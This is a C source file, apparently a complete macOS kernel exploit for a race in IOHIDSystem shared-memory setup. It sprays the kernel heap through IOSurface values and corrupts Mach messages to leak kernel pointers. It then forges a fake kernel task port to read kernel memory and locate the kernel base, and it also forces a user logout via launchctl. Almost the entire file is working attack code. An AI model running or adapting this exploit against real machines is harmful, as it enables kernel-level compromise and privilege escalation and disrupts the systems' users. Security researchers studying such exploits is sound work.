#include <errno.h>              // errno
#include <pthread.h>            // pthread_*
#include <sched.h>              // sched_yield
#include <setjmp.h>             // setjmp, longjmp
#include <signal.h>             // SIG*, signal
#include <stdint.h>             // uint32_t, uint64_t
#include <stdlib.h>             // system
#include <stdio.h>              // printf
#include <string.h>             // strerror, memcpy, memset
#include <unistd.h>             // usleep
#include <sys/sysctl.h>         // sysctlbyname
#include <mach-o/loader.h>      // MH_MAGIC_64
#include <mach/mach.h>
#include <IOKit/IOKitLib.h>
#include <IOKit/hidsystem/IOHIDShared.h> // EvOffsets, EvGlobals, kIOHID
#include "iokit.h"              // all hail Cthulu

#define LOG(str, args...) do { printf(str "\n", ##args); } while(0)

const uint64_t IOHID_SHMEM_VERSION      =  kIOHIDCurrentShmemVersion;
const uint64_t IOHID_CREATE_SHMEM       =  0;
const uint64_t IOHID_REGISTER_DISPLAY   =  7;
const uint64_t IOHID_UNREGISTER_DISPLAY =  8;
const uint64_t IOHID_SET_DISPLAY_BOUNDS =  9;

const uint64_t IOSURFACE_CREATE_SURFACE =  0;
const uint64_t IOSURFACE_SET_VALUE      =  9;
const uint64_t IOSURFACE_GET_VALUE      = 10;
const uint64_t IOSURFACE_DELETE_VALUE   = 11;

const uint32_t DATA_SIZE                =  0x3000;
const uint32_t DATA_FACTOR              =  0x10;
const uint32_t DATA_HOLES               =  0x10;
const int32_t  SHMEM_OFFSET             = -0x30000000;

const size_t   NUM_KMSG                 = 0x10;

const uint64_t OFF_KMSG_IKM_HEADER      = 0x18;
const uint64_t OFF_IKM_IMPORTANCE       = 0x38;
const uint64_t OFF_IKM_INHERITANCE      = 0x40;
const uint64_t OFF_TASK_BSD_INFO        = 0x390;
const uint64_t OFF_PROC_PID             = 0x10;

const uint64_t SIZEOF_IPC_KMSG          = 0x58;
const uint64_t SIZEOF_MACH_MSG_HEADER   = 0x20;
const uint64_t SIZEOF_MACH_MSG_BASE     = 0x24;
const uint64_t SIZEOF_MACH_MSG_TRAILER  = 0x44;
const uint64_t SIZEOF_DESC32            =  0xc;
const uint64_t SIZEOF_DESC64            = 0x10;

typedef uint64_t kptr_t;

typedef struct
{
    uint64_t port;
    uint32_t pad    : 16;
    uint32_t disp   :  8;
    uint32_t type   :  8;
    uint32_t pad_end;
} kdesc_t;

typedef struct {
    uint32_t ip_bits;
    uint32_t ip_references;
    struct {
        kptr_t data;
        uint32_t type;
        uint32_t pad;
    } ip_lock; // spinlock
    struct {
        struct {
            struct {
                uint32_t flags;
                uint32_t waitq_interlock;
                uint64_t waitq_set_id;
                uint64_t waitq_prepost_id;
                struct {
                    kptr_t next;
                    kptr_t prev;
                } waitq_queue;
            } waitq;
            kptr_t messages;
            natural_t seqno;
            natural_t receiver_name;
            uint16_t msgcount;
            uint16_t qlimit;
            uint32_t pad;
        } port;
        kptr_t klist;
    } ip_messages;
    kptr_t ip_receiver;
    kptr_t ip_kobject;
    kptr_t ip_nsrequest;
    kptr_t ip_pdrequest;
    kptr_t ip_requests;
    kptr_t ip_premsg;
    uint64_t  ip_context;
    natural_t ip_flags;
    natural_t ip_mscount;
    natural_t ip_srights;
    natural_t ip_sorights;
} kport_t;

typedef struct
{
    struct {
        kptr_t data;
        uint32_t type;
        uint32_t pad;
    } ip_lock; // mutex
    uint32_t ref_count;
    uint8_t pad[OFF_TASK_BSD_INFO - 3 * sizeof(uint32_t) - sizeof(kptr_t)];
    kptr_t bsd_info;
} ktask_t;

enum
{
    kOSSerializeDictionary      = 0x01000000U,
    kOSSerializeArray           = 0x02000000U,
    kOSSerializeSet             = 0x03000000U,
    kOSSerializeNumber          = 0x04000000U,
    kOSSerializeSymbol          = 0x08000000U,
    kOSSerializeString          = 0x09000000U,
    kOSSerializeData            = 0x0a000000U,
    kOSSerializeBoolean         = 0x0b000000U,
    kOSSerializeObject          = 0x0c000000U,

    kOSSerializeTypeMask        = 0x7F000000U,
    kOSSerializeDataMask        = 0x00FFFFFFU,

    kOSSerializeEndCollection   = 0x80000000U,

    kOSSerializeMagic           = 0x000000d3U,
};

static void ignore(int signo)
{
    /* do nothing */
}

static uint32_t transpose(uint32_t val)
{
    uint32_t ret = 0;
    for(size_t i = 0; val > 0; i += 8)
    {
        ret += (val % 255) << i;
        val /= 255;
    }
    return ret + 0x01010101;
}

static void* alloc_msg(size_t len)
{
    mach_msg_size_t size = sizeof(mach_msg_base_t) + len;
    mach_msg_base_t *msg = malloc(size);
    if(msg)
    {
        memset(msg, 0, size);

        msg->header.msgh_bits           = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
        msg->header.msgh_size           = size;
        msg->header.msgh_local_port     = MACH_PORT_NULL;
        msg->header.msgh_voucher_port   = MACH_PORT_NULL;
        msg->header.msgh_id             = 0x1337;

        msg->body.msgh_descriptor_count = 0;

        ++msg;
    }
    return msg;
}

static void free_msg(void *buf)
{
    mach_msg_base_t *msg = buf;
    --msg;
    free(msg);
}

static kern_return_t send_msg(mach_port_t port, void *buf)
{
    mach_msg_base_t *msg = buf;
    --msg;
    msg->header.msgh_remote_port = port;
    return mach_msg(&msg->header, MACH_SEND_MSG | MACH_SEND_TIMEOUT, msg->header.msgh_size, 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
}

static jmp_buf env;

static void sighandler(int signo)
{
    longjmp(env, 1);
}

typedef struct
{
    volatile int *ptr;
    int val;
} my_args_t;

static void* spam_value(void *arg)
{
    sig_t oldfunc = signal(SIGUSR1, sighandler);

    my_args_t *args = arg;
    volatile int *ptr = args->ptr;
    int val = args->val;
    if(setjmp(env) == 0)
    {
        while(1) *ptr = val;
    }

    signal(SIGUSR1, oldfunc);
    return NULL;
}

static kern_return_t start_thread(pthread_t *thread, my_args_t *args)
{
    int r = pthread_create(thread, NULL, &spam_value, args);
    if(r != 0)
    {
        LOG("pthread_create: %s", strerror(r));
        return KERN_FAILURE;
    }
    return KERN_SUCCESS;
}

static kern_return_t stop_thread(pthread_t thread)
{
    sigset_t set, old;
    int r = sigemptyset(&set);
    if(r != 0) LOG("sigemptyset: %s", strerror(r));
    else
    {
        r = sigaddset(&set, SIGUSR1);
        if(r != 0) LOG("sigaddset: %s", strerror(r));
        else
        {
            r = pthread_sigmask(SIG_BLOCK, &set, &old);
            if(r != 0) LOG("pthread_sigmask: %s", strerror(r));
            else
            {
                r = pthread_kill(thread, SIGUSR1);
                if(r != 0) LOG("pthread_kill: %s", strerror(r));
                else
                {
                    r = pthread_sigmask(SIG_SETMASK, &old, NULL);
                    if(r != 0) LOG("pthread_sigmask: %s", strerror(r));
                    else
                    {
                        r = pthread_join(thread, NULL);
                        if(r != 0) LOG("pthread_join: %s", strerror(r));
                    }
                }
            }
        }
    }
    return r == 0 ? KERN_SUCCESS : KERN_FAILURE;
}

static kern_return_t shmem_init(io_connect_t client)
{
    return IOConnectCallScalarMethod(client, IOHID_CREATE_SHMEM, &IOHID_SHMEM_VERSION, 1, NULL, NULL);
}

const uint8_t SHMEM_MODE_READ   = 1;
const uint8_t SHMEM_MODE_WRITE  = 2;
const uint8_t SHMEM_MODE_CLEAR  = 3;

static kern_return_t shmem_offset(io_connect_t client, mach_vm_address_t addr, int off, uint32_t val, uint8_t mode)
{
    EvOffsets *eop = (EvOffsets*)addr;
    EvGlobals *evg = (EvGlobals*)(addr + sizeof(EvOffsets));
    kern_return_t ret;

    uintptr_t anchor = 0;
    switch(mode)
    {
        case SHMEM_MODE_READ:
            anchor = (uintptr_t)&evg->cursorLoc;
            break;
        case SHMEM_MODE_WRITE:
            anchor = (uintptr_t)&evg->eventFlags;
            break;
        case SHMEM_MODE_CLEAR:
            anchor = (uintptr_t)&evg->lleq[1].sema;
            break;
        default:
            LOG("shmem_offset: invalid mode");
            return KERN_FAILURE;
    }

    if(mode == SHMEM_MODE_WRITE)
    {
        LOG("Writing value 0x%08x to offset %s0x%08x...", val, off < 0 ? "-" : "", off < 0 ? -off : off);
    }
    else
    {
        LOG("Offsetting shmem by %s0x%08x...", off < 0 ? "-" : "", off < 0 ? -off : off);
    }

    pthread_t thread;
    my_args_t args =
    {
        .ptr = &eop->evGlobalsOffset,
        .val = off - (anchor - (uintptr_t)evg),
    };

    if((ret = start_thread(&thread, &args)) == KERN_SUCCESS)
    {
        do
        {
            evg->eventFlags = val;
            ret = shmem_init(client);
            if(ret != KERN_SUCCESS)
            {
                LOG("Failed to re-initialize shared memory: %s", mach_error_string(ret));
                break;
            }
        } while(evg->version != 0);

        kern_return_t r = stop_thread(thread);
        if(ret == KERN_SUCCESS)
        {
            ret = r;
        }
    }

    return ret;
}

static kern_return_t shmem_leak(io_connect_t client, mach_vm_address_t addr, uint32_t display, uint32_t *val)
{
    EvOffsets *eop = (EvOffsets*)addr;
    EvGlobals *evg = (EvGlobals*)(addr + sizeof(EvOffsets));
    kern_return_t ret;

    int off = eop->evGlobalsOffset + ((uintptr_t)&evg->cursorLoc - (uintptr_t)evg);
    LOG("Leaking uint32 from offset %s0x%08x...", off < 0 ? "-" : "", off < 0 ? -off : off);
    uint64_t args[] = { display, 0, 0, 0, 0 };
    ret = IOConnectCallScalarMethod(client, IOHID_SET_DISPLAY_BOUNDS, args, 5, NULL, NULL);
    if(ret == KERN_SUCCESS)
    {
        ret = shmem_init(client);
    }

    if(ret == KERN_SUCCESS)
    {
        *val = *(volatile uint32_t*)&evg->cursorLoc;
    }
    else
    {
        LOG("Failed to leak value: %s", mach_error_string(ret));
    }

    return ret;
}

int main(void)
{
    kern_return_t ret, err = 0;
    int r = 0,
        retval = -1;
    task_t self = mach_task_self();
    host_t host = mach_host_self();
    size_t size;

    // Lots of preparations
    signal(SIGTERM, &ignore);
    signal(SIGHUP, &ignore);

    mach_port_t port = MACH_PORT_NULL;
    ret = mach_port_allocate(self, MACH_PORT_RIGHT_RECEIVE, &port);
    LOG("mach_port_allocate: %x, %s", port, mach_error_string(ret));
    if(ret != KERN_SUCCESS) return -1;
    ret = mach_port_insert_right(self, port, port, MACH_MSG_TYPE_MAKE_SEND);
    LOG("mach_port_insert_right: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS) return -1;

    mach_port_limits_t limits = { .mpl_qlimit = NUM_KMSG };
    ret = mach_port_set_attributes(self, port, MACH_PORT_LIMITS_INFO, (mach_port_info_t)&limits, sizeof(limits));
    LOG("mach_port_limits: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS) return -1;

    vm_size_t pagesize;
    _host_page_size(host, &pagesize);
    LOG("pagesize: 0x%lx", pagesize);

    io_service_t hidService = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOHIDSystem"));
    LOG("IOHIDSystem: %x", hidService);
    if(!MACH_PORT_VALID(hidService)) return -1;

    io_service_t surfaceService = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    LOG("IOSurfaceRoot: %x", surfaceService);
    if(!MACH_PORT_VALID(surfaceService)) return -1;

    io_connect_t surfaceClient = MACH_PORT_NULL;
    ret = IOServiceOpen(surfaceService, self, 0, &surfaceClient);
    LOG("IOSurfaceRootUserClient: %x, %s", surfaceClient, mach_error_string(ret));
    if(ret != KERN_SUCCESS || !MACH_PORT_VALID(surfaceClient)) return -1;

    uint32_t dict_create[] =
    {
        kOSSerializeMagic,
        kOSSerializeEndCollection | kOSSerializeDictionary | 1,

        kOSSerializeSymbol | 19,
        0x75534f49, 0x63616672, 0x6c6c4165, 0x6953636f, 0x657a, // "IOSurfaceAllocSize"
        kOSSerializeEndCollection | kOSSerializeNumber | 32,
        0x1000,
        0x0,
    };
    union
    {
        char _padding[0x6c8];
        struct
        {
            mach_vm_address_t addr1;
            mach_vm_address_t addr2;
            uint32_t type;
        } data;
    } surface;
    size = sizeof(surface);
    ret = IOConnectCallStructMethod(surfaceClient, IOSURFACE_CREATE_SURFACE, dict_create, sizeof(dict_create), &surface, &size);
    LOG("newSurface: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS) return -1;

    size_t ksize = 0;
    size = sizeof(ksize);
    r = sysctlbyname("hw.memsize", &ksize, &size, NULL, 0);
    LOG("sysctl(\"hw.memsize\"): %s", r == 0 ? "success" : strerror(errno));
    if(r != 0) return -1;

    ksize >>= 5;
    if(ksize < 0x8000000)
    {
        ksize = 0x8000000;
    }
    LOG("kalloc map size: 0x%lx", ksize);

    // Spray heap
    uint32_t dict_spray[DATA_SIZE / sizeof(uint32_t) + 7] =
    {
        // Some header or something
        surface.data.type,
        0x0,

        kOSSerializeMagic,
        kOSSerializeEndCollection | kOSSerializeArray | 2,

        kOSSerializeString | (DATA_SIZE - 1),
    };
    dict_spray[DATA_SIZE / sizeof(uint32_t) + 5] = kOSSerializeEndCollection | kOSSerializeString | 4;

    sched_yield();
    for(uint32_t i = 0; i < ksize / DATA_SIZE; ++i)
    {
        dict_spray[DATA_SIZE / sizeof(uint32_t) + 6] = transpose(i);
        uint32_t dummy;
        size = sizeof(dummy);
        ret = IOConnectCallStructMethod(surfaceClient, IOSURFACE_SET_VALUE, dict_spray, sizeof(dict_spray), &dummy, &size);
        printf("\rsetValue(%u): %s", i, mach_error_string(ret));
        if(ret != KERN_SUCCESS)
        {
            printf("\n");
            return -1;
        }
    }
    printf("\n");

    r = system("/bin/launchctl reboot logout");
    LOG("launchctl: %s", r == 0 ? "success" : strerror(r));
    if(r != 0) return -1;

    /**************************************/
    /* From here on out, we need cleanup. */
    /**************************************/
    mach_port_t fakeport = MACH_PORT_NULL;
    void *msg = NULL,
         *recv_buf = NULL;
    uint32_t *dict_huge = NULL;
    io_connect_t hidClient = MACH_PORT_NULL;

    LOG("Waiting for IOHIDUserClient...");
    do
    {
        ret = IOServiceOpen(hidService, self, kIOHIDServerConnectType, &hidClient);
        usleep(10);
    } while(ret == kIOReturnBusy);
    LOG("IOHIDUserClient: %x, %s", hidClient, mach_error_string(ret));
    if(ret != KERN_SUCCESS || !MACH_PORT_VALID(hidClient)) goto out;

    // More preparations
    LOG("Registering virtual display...");
    uint64_t display = 0;
    uint32_t cnt = 1;
    ret = IOConnectCallScalarMethod(hidClient, IOHID_REGISTER_DISPLAY, NULL, 0, &display, &cnt);
    LOG("Display: %llu, %s", display, mach_error_string(ret));
    if(ret != KERN_SUCCESS) goto out;

    mach_vm_address_t shmem_addr = 0;
    mach_vm_size_t shmem_size = 0;
    ret = IOConnectMapMemory64(hidClient, kIOHIDGlobalMemory, self, &shmem_addr, &shmem_size, kIOMapAnywhere);
    LOG("Shmem: 0x%016llx-0x%016llx, %s", shmem_addr, shmem_addr + shmem_size, mach_error_string(ret));
    if(ret != KERN_SUCCESS) goto out;

    // Trigger bug
    int32_t offset = SHMEM_OFFSET;
    ret = shmem_offset(hidClient, shmem_addr, offset, 0x12345678, SHMEM_MODE_WRITE);
    if(ret != KERN_SUCCESS) goto out;

    // Find where it landed
    uint32_t request[] =
    {
        // Same header
        surface.data.type,
        0x0,

        0x0, // Placeholder
        0x0, // Null terminator
    };
    uint32_t response[4 + (DATA_SIZE / sizeof(uint32_t))];

    uint32_t idx = 0;
    for(uint32_t i = 0; i < ksize / DATA_SIZE; ++i)
    {
        request[2] = transpose(i);
        size = sizeof(response);
        ret = IOConnectCallStructMethod(surfaceClient, IOSURFACE_GET_VALUE, request, sizeof(request), response, &size);
        printf("\rgetValue(%u): %s", i, mach_error_string(ret));
        if(ret != KERN_SUCCESS)
        {
            printf("\n");
            goto out;
        }
        for(size_t off = 0; off < DATA_SIZE; off += pagesize)
        {
            if(response[4 + (off / sizeof(uint32_t))] == 0x12345678)
            {
                printf("\n");
                LOG("Found corruption in object %u at offset 0x%lx!", i, off);
                offset -= off;
                idx = i;
                goto after;
            }
        }
    }
    printf("\n");
    LOG("Failed to find corruption.");
    goto out;

after:;
    // Align evg to the object
    ret = shmem_offset(hidClient, shmem_addr, offset + OFF_KMSG_IKM_HEADER + sizeof(uint32_t), 0x0, SHMEM_MODE_READ);
    if(ret != KERN_SUCCESS) goto out;

    sched_yield();

    // Punch holes before object
    for(uint32_t i = 1; i < DATA_FACTOR * DATA_HOLES; ++i)
    {
        if(i % DATA_FACTOR == 0)
        {
            continue;
        }
        request[2] = transpose(idx - i - 1);
        uint32_t dummy;
        size = sizeof(dummy);
        ret = IOConnectCallStructMethod(surfaceClient, IOSURFACE_DELETE_VALUE, request, sizeof(request), &dummy, &size);
        LOG("deleteValue(%u): %s", idx - i - 1, mach_error_string(ret));
        if(ret != KERN_SUCCESS) goto out;
    }

    // Prepare kmsg
    size_t kmsg_size = DATA_SIZE * DATA_FACTOR;

    size_t msg_size = kmsg_size;
    msg_size = msg_size - (SIZEOF_IPC_KMSG + SIZEOF_MACH_MSG_BASE + SIZEOF_MACH_MSG_TRAILER);   // subtract headers
    msg_size = msg_size / SIZEOF_DESC64 * SIZEOF_DESC32;                                        // shrink for port descriptors
    msg_size = msg_size & ~0x3;                                                                 // round down

    // Reverse the math again
    size_t kmsg_hdr_off = msg_size;
    kmsg_hdr_off = kmsg_hdr_off / SIZEOF_DESC32 * SIZEOF_DESC64;
    kmsg_hdr_off = kmsg_hdr_off + SIZEOF_IPC_KMSG;
    kmsg_hdr_off = kmsg_hdr_off - msg_size;

    LOG("Message size: 0x%lx", msg_size);
    msg = alloc_msg(msg_size);
    if(!msg)
    {
        LOG("alloc_msg: %s", strerror(errno));
        goto out;
    }
    recv_buf = malloc(kmsg_size);
    dict_huge = malloc(kmsg_size + 7 * sizeof(uint32_t));
    if(!recv_buf || !dict_huge)
    {
        LOG("malloc: %s", strerror(errno));
        goto out;
    }

    sched_yield();

    // Make space for kmsg
    for(uint32_t i = 0; i < DATA_FACTOR; ++i)
    {
        request[2] = transpose(idx + i);
        uint32_t dummy;
        size = sizeof(dummy);
        ret = IOConnectCallStructMethod(surfaceClient, IOSURFACE_DELETE_VALUE, request, sizeof(request), &dummy, &size);
        LOG("deleteValue(%u): %s", idx + i, mach_error_string(ret));
        if(ret != KERN_SUCCESS) goto out;
    }

    // Send kmsg
    for(size_t i = 0; i < NUM_KMSG; ++i)
    {
        ret = send_msg(port, msg);
        LOG("send_msg: %s", mach_error_string(ret));
        if(ret != KERN_SUCCESS) goto out;
    }

    // Read from kmsg
    union
    {
        struct
        {
            uint32_t lo;
            uint32_t hi;
        } u32;
        uint64_t u64;
    } addr;
    ret = shmem_leak(hidClient, shmem_addr, display, &addr.u32.hi);
    if(ret != KERN_SUCCESS) goto out;

    memset(dict_huge, 0, kmsg_size + 7 * sizeof(uint32_t));
    dict_huge[                               0] = surface.data.type;
    dict_huge[                               2] = kOSSerializeMagic;
    dict_huge[                               3] = kOSSerializeEndCollection | kOSSerializeArray | 2;
    dict_huge[                               4] = kOSSerializeString | (kmsg_size - 1);
    dict_huge[kmsg_size / sizeof(uint32_t) + 5] = kOSSerializeEndCollection | kOSSerializeString | 4;

    sched_yield();

    // Free kmsg
    for(size_t i = 0; i < NUM_KMSG; ++i)
    {
        ret = mach_msg(recv_buf, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, kmsg_size, port, 0, MACH_PORT_NULL);
        LOG("recv_msg: %s", mach_error_string(ret));
        if(ret != KERN_SUCCESS) goto out;
    }

    // Allocate buffers
    for(uint32_t i = 0; i < NUM_KMSG; ++i)
    {
        dict_huge[kmsg_size / sizeof(uint32_t) + 6] = transpose(idx + i);
        uint32_t dummy;
        size = sizeof(dummy);
        ret = IOConnectCallStructMethod(surfaceClient, IOSURFACE_SET_VALUE, dict_huge, kmsg_size + 7 * sizeof(uint32_t), &dummy, &size);
        LOG("setValue(%u): %s", idx + i, mach_error_string(ret));
        if(ret != KERN_SUCCESS) goto out;
    }

    // Offset again, 4 bytes less than last time
    ret = shmem_offset(hidClient, shmem_addr, offset + OFF_KMSG_IKM_HEADER, 0x0, SHMEM_MODE_READ);
    if(ret != KERN_SUCCESS) goto out;

    sched_yield();

    // Remove buffers again
    for(uint32_t i = 0; i < NUM_KMSG; ++i)
    {
        request[2] = transpose(idx + i);
        uint32_t dummy;
        size = sizeof(dummy);
        ret = IOConnectCallStructMethod(surfaceClient, IOSURFACE_DELETE_VALUE, request, sizeof(request), &dummy, &size);
        LOG("deleteValue(%u): %s", idx + i, mach_error_string(ret));
        if(ret != KERN_SUCCESS) goto out;
    }

    // And new messages...
    for(size_t i = 0; i < NUM_KMSG; ++i)
    {
        ret = send_msg(port, msg);
        LOG("send_msg: %s", mach_error_string(ret));
        if(ret != KERN_SUCCESS) goto out;
    }

    ret = shmem_leak(hidClient, shmem_addr, display, &addr.u32.lo);
    if(ret != KERN_SUCCESS) goto out;
    LOG("kmsg->ikm_header: 0x%llx", addr.u64);

    uint64_t kmsg_addr = addr.u64 - kmsg_hdr_off,
             shmem_kern = kmsg_addr - offset;
    LOG("kmsg: 0x%llx", kmsg_addr);
    LOG("Shmem kernel address: 0x%llx", shmem_kern);

    LOG("Repairing kmsg...");
    ret = shmem_offset(hidClient, shmem_addr, offset + OFF_IKM_INHERITANCE + sizeof(uint32_t), 0x0, SHMEM_MODE_CLEAR);
    if(ret != KERN_SUCCESS) goto out;
    ret = shmem_offset(hidClient, shmem_addr, offset + OFF_IKM_INHERITANCE, 0x0, SHMEM_MODE_CLEAR);
    if(ret != KERN_SUCCESS) goto out;
    ret = shmem_offset(hidClient, shmem_addr, offset + OFF_IKM_IMPORTANCE, 0x0, SHMEM_MODE_CLEAR);
    if(ret != KERN_SUCCESS) goto out;

    sched_yield();

    // Another round
    for(size_t i = 0; i < NUM_KMSG; ++i)
    {
        ret = mach_msg(recv_buf, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, kmsg_size, port, 0, MACH_PORT_NULL);
        LOG("recv_msg: %s", mach_error_string(ret));
        if(ret != KERN_SUCCESS) goto out;
    }
    for(uint32_t i = 0; i < NUM_KMSG; ++i)
    {
        dict_huge[kmsg_size / sizeof(uint32_t) + 6] = transpose(idx + i);
        uint32_t dummy;
        size = sizeof(dummy);
        ret = IOConnectCallStructMethod(surfaceClient, IOSURFACE_SET_VALUE, dict_huge, kmsg_size + 7 * sizeof(uint32_t), &dummy, &size);
        LOG("setValue(%u): %s", idx + i, mach_error_string(ret));
        if(ret != KERN_SUCCESS) goto out;
    }

    // Offset for writing now
    ret = shmem_offset(hidClient, shmem_addr, offset + kmsg_hdr_off + SIZEOF_MACH_MSG_HEADER, 0x0, SHMEM_MODE_WRITE);
    if(ret != KERN_SUCCESS) goto out;

    // Now we prepare an evil message :D
    kdesc_t desc =
    {
        .port = shmem_kern + pagesize,
        .disp = MACH_MSG_TYPE_PORT_SEND,
        .type = MACH_MSG_PORT_DESCRIPTOR,
    };
    memcpy(msg, &desc, sizeof(desc));

    // And a properties buffer
    uint32_t props[] =
    {
        kOSSerializeMagic,
        kOSSerializeEndCollection | kOSSerializeDictionary | 1,

        kOSSerializeSymbol | 27,
        0x4b444948, 0x6f627965, 0x47647261, 0x61626f6c, 0x646f4d6c, 0x65696669, 0x7372, // "HIDKeyboardGlobalModifiers"

        kOSSerializeEndCollection | kOSSerializeNumber | 32,
        0x1,
        0x0,
    };

    // Swap once more
    sched_yield();
    for(uint32_t i = 0; i < NUM_KMSG; ++i)
    {
        request[2] = transpose(idx + i);
        uint32_t dummy;
        size = sizeof(dummy);
        ret = IOConnectCallStructMethod(surfaceClient, IOSURFACE_DELETE_VALUE, request, sizeof(request), &dummy, &size);
        LOG("deleteValue(%u): %s", idx + i, mach_error_string(ret));
        if(ret != KERN_SUCCESS) goto out;
    }
    for(size_t i = 0; i < NUM_KMSG; ++i)
    {
        ret = send_msg(port, msg);
        LOG("send_msg: %s", mach_error_string(ret));
        if(ret != KERN_SUCCESS) goto out;
    }

    // Corrupt msgh_descriptor_count
    ret = io_connect_set_properties(hidClient, (char*)props, sizeof(props), &err);
    if(ret == KERN_SUCCESS) ret = err;
    LOG("set_properties: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS) goto out;

    // Reset shmem
    ret = shmem_init(hidClient);
    LOG("shmem_init: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS) goto out;

    // Build fake port and fake task on shmem
    memset((void*)shmem_addr, 0, shmem_size);
    kport_t *kport = (kport_t*)(shmem_addr +     pagesize);
    ktask_t *ktask = (ktask_t*)(shmem_addr + 2 * pagesize);

    kport->ip_bits = 0x80000002; // IO_BITS_ACTIVE | IOT_PORT | IKOT_TASK
    kport->ip_references = 100;
    kport->ip_lock.type = 0x26;
    kport->ip_messages.port.receiver_name = 1;
    kport->ip_messages.port.msgcount = MACH_PORT_QLIMIT_KERNEL;
    kport->ip_messages.port.qlimit   = MACH_PORT_QLIMIT_KERNEL;
    kport->ip_kobject = shmem_kern + 2 * pagesize;
    kport->ip_srights = 99;

    ktask->ref_count = 100;

    // Prepare last spray
    uint32_t dict_array[] =
    {
        // Ye olde header
        surface.data.type,
        0x0,

        kOSSerializeMagic,
        kOSSerializeEndCollection | kOSSerializeArray | 2,

        kOSSerializeArray | (kmsg_size / sizeof(kptr_t)),
        kOSSerializeEndCollection | kOSSerializeBoolean | 1,

        kOSSerializeEndCollection | kOSSerializeString | 4,
        0x0, // Placeholder
    };

    // Receive fake port :D
    sched_yield();
    for(size_t i = 0; i < NUM_KMSG; ++i)
    {
        ret = mach_msg(recv_buf, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, kmsg_size, port, 0, MACH_PORT_NULL);
        LOG("recv_msg: %s", mach_error_string(ret));
        if(ret != KERN_SUCCESS) goto out;
        mach_msg_base_t *recv_msg = recv_buf;
        if(recv_msg->body.msgh_descriptor_count > 0)
        {
            fakeport = ((mach_msg_port_descriptor_t*)(recv_msg + 1))->name;
        }
    }
    LOG("fakeport: %x", fakeport);
    if(!MACH_PORT_VALID(fakeport)) goto out;

    // Spray one last time
    for(uint32_t i = 0; i < NUM_KMSG; ++i)
    {
        dict_array[7] = transpose(idx + i);
        uint32_t dummy;
        size = sizeof(dummy);
        ret = IOConnectCallStructMethod(surfaceClient, IOSURFACE_SET_VALUE, dict_array, sizeof(dict_array), &dummy, &size);
        LOG("setValue(%u): %s", idx + i, mach_error_string(ret));
        if(ret != KERN_SUCCESS) goto out;
    }

    // Read kernel memory \o/
#define KREAD(addr, val) \
do \
{ \
    ktask->bsd_info = (addr) - OFF_PROC_PID; \
    ret = pid_for_task(fakeport, (int*)(val)); \
    if(ret != KERN_SUCCESS) \
    { \
        LOG("pid_for_task: %s", mach_error_string(ret)); \
        goto out; \
    } \
} \
while(0)
    KREAD(kmsg_addr                   , &addr.u32.lo);
    KREAD(kmsg_addr + sizeof(uint32_t), &addr.u32.hi);
    uint64_t kOSBooleanTrue = addr.u64;
    LOG("kOSBooleanTrue: 0x%llx", kOSBooleanTrue);

    KREAD(kOSBooleanTrue                   , &addr.u32.lo);
    KREAD(kOSBooleanTrue + sizeof(uint32_t), &addr.u32.hi);
    uint64_t vtable = addr.u64;
    LOG("OSBoolean vtable: 0x%llx", vtable);

    for(uint64_t kbase = vtable & ~0xfffff; 1; kbase -= 0x100000)
    {
        uint32_t magic = 0;
        KREAD(kbase, &magic);
        if(magic == MH_MAGIC_64)
        {
            LOG("Kernel base: 0x%llx", kbase);
            retval = 0;
            goto out;
        }
    }

    LOG("Failed to find kernel base (should've panicked by here...)");

out:;
    if(MACH_PORT_VALID(fakeport))
    {
        mach_port_destroy(self, fakeport);
    }
    if(MACH_PORT_VALID(hidClient))
    {
        shmem_init(hidClient);
        IOConnectCallScalarMethod(hidClient, IOHID_UNREGISTER_DISPLAY, &display, 1, NULL, NULL);
        IOServiceClose(hidClient);
    }
    if(msg)         free_msg(msg);
    if(recv_buf)    free(recv_buf);
    if(dict_huge)   free(dict_huge);

    return retval;
}
